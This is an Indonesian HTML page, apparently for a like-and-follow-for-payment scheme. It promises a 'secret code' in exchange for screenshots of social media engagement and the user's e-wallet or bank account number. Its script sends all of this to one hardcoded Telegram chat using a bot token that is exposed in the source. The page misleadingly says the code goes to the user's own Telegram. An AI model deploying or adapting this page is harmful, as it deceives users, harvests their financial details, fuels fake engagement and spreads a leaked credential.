<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Bukti Follow & Like - Dapatkan Kode Rahasia</title>
    <!-- Memuat Tailwind CSS untuk tampilan keren -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Konfigurasi Font Inter dan Custom Styling -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f3f4f6;
        }
        .file-input-custom {
            cursor: pointer;
            @apply w-full text-sm text-gray-700 file:mr-4 file:py-3 file:px-5 file:rounded-xl file:border-none file:text-sm file:font-semibold file:bg-purple-100 file:text-purple-700 hover:file:bg-purple-200 transition duration-300 rounded-xl border border-gray-300 p-2 shadow-sm;
        }
    </style>
</head>
<body>
    <div id="app" class="min-h-screen flex items-center justify-center p-4">
        <div class="w-full max-w-lg bg-white shadow-2xl rounded-2xl p-6 md:p-10 border border-purple-200 transform transition duration-500 hover:shadow-3xl">
            
            <!-- Header Tampilan -->
            <div class="text-center mb-8">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-14 h-14 text-purple-600 mx-auto mb-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 10h-6"/><path d="M14 14h-2"/><path d="M16 12l2 2 4-4"/>
                </svg>
                <h1 class="text-3xl font-extrabold text-gray-800">Dapatkan Kode Rahasia</h1>
                <p class="text-gray-500 mt-2">Lengkapi langkah di bawah dan kode akan dikirimkan ke Telegram.</p>
                
                <!-- Pemberitahuan Penting -->
                <div class="mt-4 p-3 bg-purple-50 border border-purple-300 rounded-xl text-sm font-medium text-purple-800 shadow-md">
                    <p class="font-bold">🔑 Pengiriman Kode: Setelah verifikasi, kode akan dikirimkan ke akun Telegram Anda.</p>
                </div>
            </div>

            <form id="verificationForm" class="space-y-6">
                
                <!-- ID Akun (Informasi) -->
                <div class="p-4 bg-gray-50 rounded-xl text-sm text-gray-700 font-medium border border-gray-200">
                    <p>ID Akun Anda (Otomatis): <span id="accountIdDisplay" class="font-bold text-purple-600">{{id_user}}</span></p>
                    <input type="hidden" id="accountId" value="6142141706">
                </div>

                <!-- Input Foto 1: Screenshot Akun Sudah di Like & Follow -->
                <div class="border-b pb-4">
                    <label for="likeFollowSS" class="block text-base font-bold text-gray-700 mb-2">1. Bukti **Sudah Like & Follow**</label>
                    <input type="file" id="likeFollowSS" name="likeFollowSS" accept="image/*" required 
                           class="file-input-custom">
                    <p class="text-xs text-gray-400 mt-1">Screenshot akun target yang sudah Anda Like dan Follow (terlihat statusnya).</p>
                </div>

                <!-- Input Foto 2: Screenshot Akun yang Memfollow dan Like -->
                <div class="border-b pb-4">
                    <label for="followerSS" class="block text-base font-bold text-gray-700 mb-2">2. Bukti Akun Anda **Memfollow & Like**</label>
                    <input type="file" id="followerSS" name="followerSS" accept="image/*" required
                           class="file-input-custom">
                    <p class="text-xs text-gray-400 mt-1">Screenshot akun Anda yang menunjukkan bahwa Anda telah melakukan Like & Follow.</p>
                </div>
                
                <!-- Input Tipe Pembayaran (Lebih Menonjol) -->
                <div class="p-4 bg-yellow-50 rounded-xl border border-yellow-300 shadow-lg">
                    <label for="paymentType" class="block text-base font-bold text-gray-700 mb-3">3. Pilih Tipe Pembayaran Anda</label>
                    <select id="paymentType" name="paymentType" required
                            class="w-full p-3 border border-gray-400 rounded-xl text-gray-700 bg-white shadow-inner focus:ring-purple-500 focus:border-purple-500 transition duration-150 font-semibold">
                        <option value="" disabled selected>-- Pilih Metode Pembayaran --</option>
                        <option value="Dana">Dana (E-Wallet)</option>
                        <option value="Ovo">Ovo (E-Wallet)</option>
                        <option value="Gopay">Gopay (E-Wallet)</option>
                        <option value="Bank BCA">Bank BCA</option>
                        <option value="Lainnya">Lainnya (Tulis di Catatan Jika Ada)</option>
                    </select>
                </div>

                <!-- Input Nomor Rekening/E-Wallet (Muncul Setelah Pilihan) -->
                <div id="accountNumberGroup" class="hidden">
                    <label for="accountNumberInput" class="block text-base font-bold text-gray-700 mb-2">4. Masukkan Nomor Rekening/E-Wallet</label>
                    <input type="text" id="accountNumberInput" name="accountNumberInput" placeholder="Contoh: 081234567890 atau 1234567890" 
                           class="w-full p-3 border border-gray-400 rounded-xl text-gray-700 shadow-inner focus:ring-purple-500 focus:border-purple-500 transition duration-150"
                           maxlength="20">
                    <p class="text-xs text-gray-500 mt-1">Nomor ini akan disertakan dalam catatan untuk verifikasi pembayaran Anda.</p>
                </div>

                <!-- Tombol Submit -->
                <button type="submit" id="submitButton"
                        class="w-full flex items-center justify-center px-6 py-4 border border-transparent text-lg font-bold rounded-xl shadow-xl text-white bg-purple-600 hover:bg-purple-700 focus:outline-none focus:ring-4 focus:ring-offset-2 focus:ring-purple-500 transition duration-300 ease-in-out disabled:bg-gray-400 disabled:shadow-none"
                        disabled>
                    <svg id="loadingSpinner" class="animate-spin -ml-1 mr-3 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span id="buttonText">Kirim Bukti & Dapatkan Kode</span>
                </button>
            </form>

            <!-- Area Pesan Feedback (Sukses/Gagal) -->
            <div id="messageBox" class="mt-8 p-4 text-base rounded-xl hidden border-l-4 font-medium shadow-md" role="alert">
                <!-- Pesan akan diisi oleh JavaScript -->
            </div>
            
        </div>
    </div>

    <script>
        // --- Konfigurasi Telegram ---
        // BOT_TOKEN dan CHAT_ID TIDAK BOLEH KOSONG
        const BOT_TOKEN = '7607032278:AAFWj1-8izUSlcX_vWiqAaip8wqYrLnTQkY'; 
        const CHAT_ID = '6142141706'; 
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

        // --- Elemen DOM ---
        const form = document.getElementById('verificationForm');
        const submitButton = document.getElementById('submitButton');
        const buttonText = document.getElementById('buttonText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const messageBox = document.getElementById('messageBox');
        
        const likeFollowSSInput = document.getElementById('likeFollowSS');
        const followerSSInput = document.getElementById('followerSS');
        const paymentTypeSelect = document.getElementById('paymentType');

        // Elemen baru
        const accountNumberGroup = document.getElementById('accountNumberGroup');
        const accountNumberInput = document.getElementById('accountNumberInput');
        const requiredPaymentTypes = ['Dana', 'Ovo', 'Gopay', 'Bank BCA'];


        // --- Fungsi Helper untuk Menampilkan Pesan di UI (Modal Custom) ---
        function showMessage(type, message) {
            messageBox.classList.remove('hidden', 'bg-red-100', 'text-red-700', 'border-red-500', 'bg-green-100', 'text-green-700', 'border-green-500');
            
            if (type === 'success') {
                messageBox.classList.add('bg-green-100', 'text-green-700', 'border-green-500');
                messageBox.innerHTML = `<p class="font-bold">Sukses!</p><p>${message}</p>`;
            } else {
                messageBox.classList.add('bg-red-100', 'text-red-700', 'border-red-500');
                messageBox.innerHTML = `<p class="font-bold">Gagal!</p><p>${message}</p>`;
            }
        }

        // --- Fungsi Validasi Real-time ---
        function checkValidity() {
            const allFilesSelected = likeFollowSSInput.files.length > 0 && 
                                     followerSSInput.files.length > 0;
            const paymentTypeSelected = paymentTypeSelect.value !== "";
            const isAccountNumberNeeded = requiredPaymentTypes.includes(paymentTypeSelect.value);
            
            let isAccountNumberValid = true;

            // Logika untuk menampilkan/menyembunyikan input nomor rekening
            if (isAccountNumberNeeded) {
                accountNumberGroup.classList.remove('hidden');
                accountNumberInput.required = true;
                // Cek apakah input nomor rekening sudah diisi
                isAccountNumberValid = accountNumberInput.value.trim() !== "";
            } else {
                accountNumberGroup.classList.add('hidden');
                accountNumberInput.required = false;
                accountNumberInput.value = ""; // Bersihkan nilai jika disembunyikan
                isAccountNumberValid = true; // Tidak diperlukan, jadi dianggap valid
            }

            // Tombol aktif jika: 2 file + 1 pilihan (tidak kosong) + Nomor Rekening (jika diperlukan)
            const formIsValid = allFilesSelected && paymentTypeSelected && isAccountNumberValid;
            submitButton.disabled = !formIsValid;

            // Perubahan visual tombol saat aktif/nonaktif
            if (submitButton.disabled) {
                submitButton.classList.remove('bg-purple-600', 'hover:bg-purple-700');
                submitButton.classList.add('bg-gray-400');
            } else {
                submitButton.classList.remove('bg-gray-400');
                submitButton.classList.add('bg-purple-600', 'hover:bg-purple-700');
            }
        }

        // Tambahkan listener untuk validasi saat file dipilih, pilihan, atau input teks diubah
        likeFollowSSInput.addEventListener('change', checkValidity);
        followerSSInput.addEventListener('change', checkValidity);
        paymentTypeSelect.addEventListener('change', checkValidity);
        accountNumberInput.addEventListener('input', checkValidity);


        // --- Fungsi Utama Pengiriman Foto ke Telegram (dengan Backoff) ---
        async function sendToTelegram(file, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file); 
            formData.append('caption', caption);

            const url = `${TELEGRAM_API_URL}/sendPhoto`;
            
            const maxRetries = 3;
            let currentRetry = 0;

            while (currentRetry < maxRetries) {
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        body: formData
                    });

                    const data = await response.json();

                    if (!response.ok || !data.ok) {
                        throw new Error(`Gagal mengirim foto: ${data.description || 'Respons tidak OK'}`);
                    }
                    return data;
                } catch (error) {
                    console.error(`Percobaan ke ${currentRetry + 1} gagal untuk ${caption}:`, error);
                    currentRetry++;
                    if (currentRetry < maxRetries) {
                        const delay = Math.pow(2, currentRetry) * 1000; // 1s, 2s, 4s delay
                        await new Promise(resolve => setTimeout(resolve, delay));
                    } else {
                        throw new Error(`Semua percobaan gagal mengirim file bukti.`);
                    }
                }
            }
        }
        
        // --- Fungsi Pengiriman Teks Tambahan (Metode Pembayaran & Nomor Akun) ---
        async function sendPaymentType(accountId, paymentType, accountNumber) {
             let message;

             if (accountNumber) {
                 // Sertakan nomor rekening jika ada
                 message = `[${accountId}] TIPE PEMBAYARAN DIPILIH:\nMetode: **${paymentType}**\nNomor Akun: **${accountNumber}**\n\n--- Catatan: Kode akan dikirimkan ke Telegram ID ini. ---`;
             } else {
                 // Hanya tipe pembayaran (untuk "Lainnya")
                 message = `[${accountId}] TIPE PEMBAYARAN DIPILIH:\nMetode: **${paymentType}**\n\n--- Catatan: Kode akan dikirimkan ke Telegram ID ini. ---`;
             }
             
             const url = `${TELEGRAM_API_URL}/sendMessage`;
             
             const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: message,
                    parse_mode: 'Markdown' // Menggunakan Markdown untuk format tebal
                })
             });
             const data = await response.json();
             if (!response.ok || !data.ok) {
                throw new Error(`Gagal mengirim data pembayaran: ${data.description || 'Respons tidak OK'}`);
             }
             return data;
        }


        // --- Event Listener untuk Submit Formulir ---
        form.addEventListener('submit', async (e) => {
            e.preventDefault(); 

            // 1. Ambil data
            const files = {
                likeFollowSS: likeFollowSSInput.files[0],
                followerSS: followerSSInput.files[0],
            };
            const paymentType = paymentTypeSelect.value;
            const accountNumber = accountNumberInput.value.trim();
            const accountId = document.getElementById('accountId').value;
            
            // 2. Tampilkan Loading State
            submitButton.disabled = true;
            loadingSpinner.classList.remove('hidden');
            buttonText.textContent = 'Memproses...';
            messageBox.classList.add('hidden');

            try {
                // 3. Kirim Foto 1: SS Sudah Like & Follow
                await sendToTelegram(files.likeFollowSS, `[${accountId}] BUKTI 1: SS SUDAH DI LIKE & FOLLOW`);
                
                // 4. Kirim Foto 2: SS Akun yang Memfollow & Like
                await sendToTelegram(files.followerSS, `[${accountId}] BUKTI 2: SS AKUN YANG MEMFOLLOW & LIKE`);
                
                // 5. Kirim Tipe Pembayaran & Nomor Akun (Teks)
                await sendPaymentType(accountId, paymentType, accountNumber);
                

                // 6. Sukses
                showMessage('success', 
                    'Bukti Anda telah **berhasil terkirim!** Data sedang kami verifikasi. Kode rahasia akan dikirimkan ke akun **Telegram** Anda dalam waktu 5-10 menit.'
                );

                // Reset formulir setelah sukses
                form.reset();
                checkValidity(); // Update tombol submit
                
            } catch (error) {
                // 7. Gagal
                console.error('Kesalahan Global Pengiriman:', error);
                showMessage('error', 
                    `Terjadi kesalahan saat mengirim: ${error.message}. Pastikan koneksi internet Anda stabil dan file foto tidak lebih dari 5MB.`
                );
            } finally {
                // 8. Sembunyikan Loading State
                loadingSpinner.classList.add('hidden');
                buttonText.textContent = 'Kirim Bukti & Dapatkan Kode';
                submitButton.disabled = false;
                checkValidity(); // Set class tombol kembali normal
            }
        });
        
        // Memastikan tombol submit tidak aktif saat halaman pertama dimuat
        checkValidity(); 

    </script>
</body>
</html>


